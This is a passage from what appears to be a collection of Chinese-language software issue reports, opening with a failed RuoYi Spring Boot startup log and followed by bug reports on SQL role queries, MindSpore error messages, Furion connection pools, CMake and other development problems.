软中国.m2\repository\com\alibaba\druid-spring-boot-starter\1.1.14\druid-spring-boot-starter-1.1.14.jar;C:\Users\微软中国.m2\repository\com\alibaba\druid\1.1.14\druid-1.1.14.jar;C:\Users\微软中国.m2\repository\org\slf4j\slf4j-api\1.7.25\slf4j-api-1.7.25.jar;C:\Users\微软中国.m2\repository\org\apache\commons\commons-lang3\3.8.1\commons-lang3-3.8.1.jar;C:\Users\微软中国.m2\repository\commons-io\commons-io\2.5\commons-io-2.5.jar;C:\Users\微软中国.m2\repository\commons-fileupload\commons-fileupload\1.3.3\commons-fileupload-1.3.3.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-core\1.4.0\shiro-core-1.4.0.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-lang\1.4.0\shiro-lang-1.4.0.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-cache\1.4.0\shiro-cache-1.4.0.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-crypto-hash\1.4.0\shiro-crypto-hash-1.4.0.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-crypto-core\1.4.0\shiro-crypto-core-1.4.0.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-crypto-cipher\1.4.0\shiro-crypto-cipher-1.4.0.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-config-core\1.4.0\shiro-config-core-1.4.0.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-config-ogdl\1.4.0\shiro-config-ogdl-1.4.0.jar;C:\Users\微软中国.m2\repository\commons-beanutils\commons-beanutils\1.9.3\commons-beanutils-1.9.3.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-event\1.4.0\shiro-event-1.4.0.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-spring\1.4.0\shiro-spring-1.4.0.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-web\1.4.0\shiro-web-1.4.0.jar;C:\Users\微软中国.m2\repository\org\apache\shiro\shiro-ehcache\1.4.0\shiro-ehcache-1.4.0.jar;C:\Users\微软中国.m2\repository\net\sf\ehcache\ehcache-core\2.6.11\ehcache-core-2.6.11.jar;C:\Users\微软中国.m2\repository\com\github\theborakompanioni\thymeleaf-extras-shiro\2.0.0\thymeleaf-extras-shiro-2.0.0.jar;C:\Users\微软中国.m2\repository\com\alibaba\fastjson\1.2.47\fastjson-1.2.47.jar;C:\Users\微软中国.m2\repository\eu\bitwalker\UserAgentUtils\1.19\UserAgentUtils-1.19.jar;C:\Users\微软中国.m2\repository\org\springframework\spring-context-support\5.1.3.RELEASE\spring-context-support-5.1.3.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\spring-beans\5.1.3.RELEASE\spring-beans-5.1.3.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\spring-context\5.1.3.RELEASE\spring-context-5.1.3.RELEASE.jar;C:\Users\微软中国.m2\repository\org\quartz-scheduler\quartz\2.3.0\quartz-2.3.0.jar;C:\Users\微软中国.m2\repository\com\mchange\mchange-commons-java\0.2.11\mchange-commons-java-0.2.11.jar;C:\Users\微软中国.m2\repository\org\apache\velocity\velocity\1.7\velocity-1.7.jar;C:\Users\微软中国.m2\repository\commons-collections\commons-collections\3.2.1\commons-collections-3.2.1.jar;C:\Users\微软中国.m2\repository\commons-lang\commons-lang\2.4\commons-lang-2.4.jar;C:\Users\微软中国.m2\repository\com\github\penggle\kaptcha\2.3.2\kaptcha-2.3.2.jar;C:\Users\微软中国.m2\repository\com\jhlabs\filters\2.0.235-1\filters-2.0.235-1.jar;C:\Users\微软中国.m2\repository\io\springfox\springfox-swagger2\2.9.2\springfox-swagger2-2.9.2.jar;C:\Users\微软中国.m2\repository\io\springfox\springfox-spi\2.9.2\springfox-spi-2.9.2.jar;C:\Users\微软中国.m2\repository\io\springfox\springfox-core\2.9.2\springfox-core-2.9.2.jar;C:\Users\微软中国.m2\repository\io\springfox\springfox-schema\2.9.2\springfox-schema-2.9.2.jar;C:\Users\微软中国.m2\repository\io\springfox\springfox-swagger-common\2.9.2\springfox-swagger-common-2.9.2.jar;C:\Users\微软中国.m2\repository\io\springfox\springfox-spring-web\2.9.2\springfox-spring-web-2.9.2.jar;C:\Users\微软中国.m2\repository\com\google\guava\guava\20.0\guava-20.0.jar;C:\Users\微软中国.m2\repository\com\fasterxml\classmate\1.4.0\classmate-1.4.0.jar;C:\Users\微软中国.m2\repository\org\springframework\plugin\spring-plugin-core\1.2.0.RELEASE\spring-plugin-core-1.2.0.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\plugin\spring-plugin-metadata\1.2.0.RELEASE\spring-plugin-metadata-1.2.0.RELEASE.jar;C:\Users\微软中国.m2\repository\org\mapstruct\mapstruct\1.2.0.Final\mapstruct-1.2.0.Final.jar;C:\Users\微软中国.m2\repository\io\swagger\swagger-annotations\1.5.21\swagger-annotations-1.5.21.jar;C:\Users\微软中国.m2\repository\io\swagger\swagger-models\1.5.21\swagger-models-1.5.21.jar;C:\Users\微软中国.m2\repository\com\fasterxml\jackson\core\jackson-annotations\2.9.0\jackson-annotations-2.9.0.jar;C:\Users\微软中国.m2\repository\io\springfox\springfox-swagger-ui\2.9.2\springfox-swagger-ui-2.9.2.jar;C:\Users\微软中国.m2\repository\com\github\oshi\oshi-core\3.9.1\oshi-core-3.9.1.jar;C:\Users\微软中国.m2\repository\net\java\dev\jna\jna\4.5.2\jna-4.5.2.jar;C:\Users\微软中国.m2\repository\net\java\dev\jna\jna-platform\4.5.2\jna-platform-4.5.2.jar;C:\Users\微软中国.m2\repository\org\jsoup\jsoup\1.11.3\jsoup-1.11.3.jar;C:\Users\微软中国.m2\repository\org\apache\poi\poi-ooxml\3.17\poi-ooxml-3.17.jar;C:\Users\微软中国.m2\repository\org\apache\poi\poi\3.17\poi-3.17.jar;C:\Users\微软中国.m2\repository\commons-codec\commons-codec\1.11\commons-codec-1.11.jar;C:\Users\微软中国.m2\repository\org\apache\commons\commons-collections4\4.1\commons-collections4-4.1.jar;C:\Users\微软中国.m2\repository\org\apache\poi\poi-ooxml-schemas\3.17\poi-ooxml-schemas-3.17.jar;C:\Users\微软中国.m2\repository\org\apache\xmlbeans\xmlbeans\2.6.0\xmlbeans-2.6.0.jar;C:\Users\微软中国.m2\repository\stax\stax-api\1.0.1\stax-api-1.0.1.jar;C:\Users\微软中国.m2\repository\com\github\virtuald\curvesapi\1.04\curvesapi-1.04.jar"" com.ruoyi.RuoYiApplication Application Version: 3.3.0 Spring Boot Version: 2.1.1.RELEASE //////////////////////////////////////////////////////////////////// // <em>ooOoo</em> // // o8888888o // // 88"" . ""88 // // (| ^_^ |) // // O\ = /O // // <em><em>/. // // / \||| : |||// \ // // / <em>||||| -:- |||||- \ // // | | \\ - /// | | // // | _| ''---/'' | | // // \ .-_</em> <em>/-. / // // <em>. . ___ // // ."""" '&lt; - `.;;. : | | // // \ \ / / // // ========-.</em>_</em></em>/</em>.-=---=' // // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ // // 佛祖保佑 永不宕机 永无BUG // //////////////////////////////////////////////////////////////////// 11:22:54.548 [main] INFO c.r.RuoYiApplication - [logStarting,50] - Starting RuoYiApplication on PC11G with PID 10684 (started by 微软中国 in E:\压缩包\RuoYi-fast) 11:22:54.553 [main] DEBUG c.r.RuoYiApplication - [logStarting,53] - Running with Spring Boot v2.1.1.RELEASE, Spring v5.1.3.RELEASE 11:22:54.554 [main] INFO c.r.RuoYiApplication - [logStartupProfileInfo,679] - The following profiles are active: druid 11:22:57.333 [main] INFO o.a.s.c.e.EhCacheManager - [getCache,158] - Cache with name 'com.ruoyi.framework.shiro.realm.UserRealm.authorizationCache' does not yet exist. Creating now. 11:22:57.334 [main] INFO o.a.s.c.e.EhCacheManager - [getCache,165] - Added EhCache named [com.ruoyi.framework.shiro.realm.UserRealm.authorizationCache] 11:22:57.748 [main] WARN o.s.b.w.s.c.AnnotationConfigServletWebServerApplicationContext - [refresh,554] - Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'shiroFilterFactoryBean' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: BeanPostProcessor before instantiation of bean failed; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'authorizationAttributeSourceAdvisor' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'authorizationAttributeSourceAdvisor' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userRealm': Unsatisfied dependency expressed through field 'menuService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuServiceImpl': Unsatisfied dependency expressed through field 'menuMapper'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuMapper' defined in file [E:\压缩包\RuoYi-fast\target\classes\com\ruoyi\project\system\menu\mapper\MenuMapper.class]: Unsatisfied dependency expressed through bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/baomidou/mybatisplus/autoconfigure/MybatisPlusAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method 'sqlSessionFactory' threw exception; nested exception is java.lang.NoClassDefFoundError: org/mybatis/logging/LoggerFactory 11:22:57.767 [main] ERROR o.s.b.SpringApplication - [reportFailure,858] - Application run failed org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'shiroFilterFactoryBean' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: BeanPostProcessor before instantiation of bean failed; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'authorizationAttributeSourceAdvisor' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'authorizationAttributeSourceAdvisor' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userRealm': Unsatisfied dependency expressed through field 'menuService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuServiceImpl': Unsatisfied dependency expressed through field 'menuMapper'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuMapper' defined in file [E:\压缩包\RuoYi-fast\target\classes\com\ruoyi\project\system\menu\mapper\MenuMapper.class]: Unsatisfied dependency expressed through bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/baomidou/mybatisplus/autoconfigure/MybatisPlusAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method 'sqlSessionFactory' threw exception; nested exception is java.lang.NoClassDefFoundError: org/mybatis/logging/LoggerFactory at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:493) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:204) at org.springframework.context.support.PostProcessorRegistrationDelegate.registerBeanPostProcessors(PostProcessorRegistrationDelegate.java:240) at org.springframework.context.support.AbstractApplicationContext.registerBeanPostProcessors(AbstractApplicationContext.java:707) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:531) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:142) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:775) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:316) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1260) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1248) at com.ruoyi.RuoYiApplication.main(RuoYiApplication.java:18) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'authorizationAttributeSourceAdvisor' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'authorizationAttributeSourceAdvisor' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userRealm': Unsatisfied dependency expressed through field 'menuService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuServiceImpl': Unsatisfied dependency expressed through field 'menuMapper'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuMapper' defined in file [E:\压缩包\RuoYi-fast\target\classes\com\ruoyi\project\system\menu\mapper\MenuMapper.class]: Unsatisfied dependency expressed through bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/baomidou/mybatisplus/autoconfigure/MybatisPlusAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method 'sqlSessionFactory' threw exception; nested exception is java.lang.NoClassDefFoundError: org/mybatis/logging/LoggerFactory at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:769) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:509) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1288) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1127) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:538) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:498) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:204) at org.springframework.aop.framework.autoproxy.BeanFactoryAdvisorRetrievalHelper.findAdvisorBeans(BeanFactoryAdvisorRetrievalHelper.java:91) at org.springframework.aop.framework.autoproxy.AbstractAdvisorAutoProxyCreator.findCandidateAdvisors(AbstractAdvisorAutoProxyCreator.java:109) at org.springframework.aop.aspectj.annotation.AnnotationAwareAspectJAutoProxyCreator.findCandidateAdvisors(AnnotationAwareAspectJAutoProxyCreator.java:92) at org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator.shouldSkip(AspectJAwareAdvisorAutoProxyCreator.java:101) at org.springframework.aop.framework.autoproxy.AbstractAutoProxyCreator.postProcessBeforeInstantiation(AbstractAutoProxyCreator.java:253) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInstantiation(AbstractAutowireCapableBeanFactory.java:1091) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.resolveBeforeInstantiation(AbstractAutowireCapableBeanFactory.java:1064) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:487) ... 14 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userRealm': Unsatisfied dependency expressed through field 'menuService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuServiceImpl': Unsatisfied dependency expressed through field 'menuMapper'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuMapper' defined in file [E:\压缩包\RuoYi-fast\target\classes\com\ruoyi\project\system\menu\mapper\MenuMapper.class]: Unsatisfied dependency expressed through bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/baomidou/mybatisplus/autoconfigure/MybatisPlusAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method 'sqlSessionFactory' threw exception; nested exception is java.lang.NoClassDefFoundError: org/mybatis/logging/LoggerFactory at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:769) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:509) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1288) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1127) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:538) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:498) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:273) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1237) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1164) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:857) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:760) ... 31 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userRealm': Unsatisfied dependency expressed through field 'menuService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuServiceImpl': Unsatisfied dependency expressed through field 'menuMapper'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuMapper' defined in file [E:\压缩包\RuoYi-fast\target\classes\com\ruoyi\project\system\menu\mapper\MenuMapper.class]: Unsatisfied dependency expressed through bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/baomidou/mybatisplus/autoconfigure/MybatisPlusAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method 'sqlSessionFactory' threw exception; nested exception is java.lang.NoClassDefFoundError: org/mybatis/logging/LoggerFactory at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:596) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:90) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:374) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1378) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:575) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:498) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:273) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1237) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1164) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:857) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:760) ... 45 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuServiceImpl': Unsatisfied dependency expressed through field 'menuMapper'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'menuMapper' defined in file [E:\压缩包\RuoYi-fast\target\classes\com\ruoyi\project\system\menu\mapper\MenuMapper.class]: Unsatisfied dependency expressed through bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/baomidou/mybatisplus/autoconfigure/MybatisPlusAutoConfiguration.class]: Bean instantiation via factory method failed; nested excepti   <code>: ---'\____ // // .' \\| |// - . .' /--.--\ .___\_&lt;|&gt;_/___.' &gt;'"""". // // | | : \ _ / / - -. \_ __\ /__ _/ .- -.____ ____.-'======== // //"
添加角色信息时的问题,"添加角色信息时就保存了 菜单ID 和 角色ID 的关联关系，这个时候并没有用户的信息，但是在下面查询这个刚添加的角色信息的时候后，却使用了用户信息来查询，导致查询不到刚添加的角色信息 这里是查询角色信息， 接口名称为 : /system/role/list , 具体调用SQL 如下   <code>: ` /** * 新增角色菜单信息 * * @param role 角色对象 */ public int insertRoleMenu(SysRole role) { int rows = 1; // 新增 角色与菜单 ID 绑定关系 List&lt;SysRoleMenu&gt; list = new ArrayList&lt;SysRoleMenu&gt;(); for (Long menuId : role.getMenuIds()) { SysRoleMenu rm = new SysRoleMenu(); rm.setRoleId(role.getRoleId()); rm.setMenuId(menuId); list.add(rm); } if (list.size() &gt; 0) { rows = roleMenuMapper.batchRoleMenu(list); } return rows; }` &lt;sql id=""selectRoleContactVo""&gt; select distinct r.role_id, r.role_name, r.role_key, r.role_sort, r.data_scope, r.status, r.del_flag, r.create_time, r.remark from sys_role r left join sys_user_role ur on ur.role_id = r.role_id left join sys_user u on u.user_id = ur.user_id left join sys_dept d on u.dept_id = d.dept_id &lt;/sql&gt; &lt;select id=""selectRoleList"" parameterType=""SysRole"" resultMap=""SysRoleResult""&gt; &lt;include refid=""selectRoleVo""/&gt; *** &lt;/select&gt;"
make root-rebuild 失败,测试 基于 ls3a7a 编译 hello 模块 最后一步报错： 0.5-rc3 中测试过是好的，是不是新引入的 bug   <code>: $ make modules M=src/modules/hello/ $ make modules-install M=src/modules/hello $ make root-rebuild ERR: /labs/linux-lab/boards/mips64el/ls3a7a/bsp/root/2016.05/rootfs is not a valid rootfs directory. make: *** [Makefile:2057: root-rebuild] Error
根据Cron表达式进行数据分组统计,"使用的JDK版本和Hutool版本 JDK：1.8 使用的工具: 功能描述： 根据cron表单式进行分组功能，如数据统计的 年 月 日 分 来进行分组   <code>: &lt;dependency&gt; &lt;groupId&gt;org.redisson&lt;/groupId&gt; &lt;artifactId&gt;redisson&lt;/artifactId&gt; &lt;version&gt;3.5.7&lt;/version&gt; &lt;/dependency&gt; String interval = ""0 0/1 * * * ? *""; CronExpression cron = new CronExpression(interval); Map&lt;Long, List&lt;Test&gt;&gt; collect =time.parallelStream().collect(Collectors.groupingBy(m -&gt; cron.getNextValidTimeAfter(new Date(m.getTime())).getTime()));"
并发请求异步方法导致超数据库连接池,"Furion 版本号 V4.7.9 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 发生了什么？ 在使用jmeter并发请求异步方法的时候，应用程序会卡死，最终异常提示数据库超连接池（若未出现，可以多尝试几次，当启动jmeter时候，若执行的很慢，则说明问题重现了。） 项目已发布部署到公网，访问地址在代码里面可以看见 异常堆栈是什么？ 请看下是哪里的原因导致的   <code>: public async Task&lt;object&gt; GetSync() { return await DbContext.Instance.Queryable&lt;Advs&gt;().Select(c =&gt; new { id = c.Id, title = c.Title, photo = c.Photo }).FirstAsync(); }"
 Cannot enable P2P access from 0 to 1,这是正确安装的吗，是什么意思   <code>: Cannot enable P2P access from 0 to 1
[CT][MS][Expand]shape valid msg and API info  need optimize ,"Expand参数校验信息有待优化 API信息描述，有些地方可以优化一下 / 硬件环境: /device ascend/CPU/ : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行测试用例 shape传无效值时 给出明确的错误信息且可以指导用户修正 报错信息里没有明确给出参数名 shape   <code>: def test_expand_shape_2d(): input_x = Tensor(np.random.randn(65, 21).astype(np.float32)) input_shape = Tensor(np.random.randint(100, 200, size=(3, 2), dtype=np.int32)) fact = ExpandMock(inputs=[input_x, input_shape]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() def test_expand_shape_2d(): input_x = Tensor(np.random.randn(65, 21).astype(np.float32)) input_shape = Tensor(np.random.randint(100, 200, size=(3, 2), dtype=np.int32)) fact = ExpandMock(inputs=[input_x, input_shape]) # with pytest.raises(ValueError): fact.forward_mindspore_impl() E ValueError: build/mindspore/merge/mindspore/core/ops_merge.cc:11464 ExpandInferShape] For Expand, the input tensor must be a 1-D tensor."
模版引擎引入分片（fragment）的问题,"现在页面是通过来引入通用头部（CSS,JS等）的,这种写法导致的问题就是：页面没有办法在head中添加内容了。 比如：我有个订单页面需要加载css，这个css文件并不是每一个页面都会用，虽然有办法加进去，但是很别扭。 我目前的处理方式是这样的: 我不确定这是是不是最好的处理方式。请指教   <code>: &lt;head th:include=""include :: header""&gt;&lt;/head&gt; &lt;head&gt; &lt;!-- common header --&gt; &lt;th:block th:include=""include :: header"" /&gt; &lt;!-- custom resource --&gt; &lt;link th:href=""@{/ajax/libs/staps/jquery.steps.css}"" rel=""stylesheet""/&gt; &lt;/head&gt;"
cmake build static library dependency,"when there is a command in cc_library, we use it merge static library together. it need dependencies pre-compiled. we need to add static library dependency compiled command before it will be used in merge process.   <code>: cc_library(paddle_go_optimizer DEPS paddle_optimizer paddle_proto glog gflags)"
jbc2mpl eh issue: incorrect try/catch order,Some catch blocks are emitted before their try blocks which might form a loop. for a function jbc2mpl generated from OpenJDK 8 jar file   <code>: func &amp;Lsun_2Fnet_2Fwww_2Fhttp_2FKeepAliveStreamCleaner_3B_7Crun_7C_28_29V @label179726 catch { &lt;* void&gt; } dassign %Reg0_R20209 0 (regread ptr %%thrownval) try { @label179726 @label179739 } #INSTIDX : 81||0051: astore 11 dassign %Reg14_R20209 0 (dread ref %Reg0_R20209) #INSTIDX : 83||0053: aload_2 #INSTIDX : 84||0054: monitorexit syncexit (dread ref %Reg5_R12) endtry
[CT][MS][OP]Round op error msg incorrect when dtype is invalid at cpu or ascend,": Ascend， CPU /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 执行用例 round算子给不支持的dtype， 报错信息有误 round算子给不支持的dtype，应该提示支持哪些类型（正确的），当前是哪种类型   <code>: def test_round_input_dtype_bool(): fact = RoundFactory(input_shape=(64, 128), dtype=bool) #with pytest.raises((RuntimeError, TypeError, ValueError)): &gt; fact.forward_mindspore_impl() E TypeError: mindspore/core/utils/check_convert_utils.cc:595 CheckTensorSubClass] For primitive[Round], the input argument[x] must be a t ype of { Tensor[Float16], Tensor[UInt64], Tensor[UInt32], Tensor[Int8], Tensor[Int32], Tensor[Int16], Tensor[Float32], Tensor[Int64], Tensor[UI nt8], Tensor[UInt16], Tensor[Complex64], Tensor[Complex128], Tensor[Float64],}, but got Bool."
代码中的错误地方,"版本: v7 LogRecordDTO.java(dateTime) -- SysLog.java 中的参数不对应, 返回空, 前台参数为create_time 清空日志参数不对应: line:75 原代码: 修改代码: 在线用户页面, 分页无效   <code>: queryData['beginDateTime'] = $(""#beginDate"").val(); queryData['endDateTime'] = $(""#endDate"").val(); queryData['beginDateTime'] = $(""#beginDateTime"").val(); queryData['endDateTime'] = $(""#endDateTime"").val();"
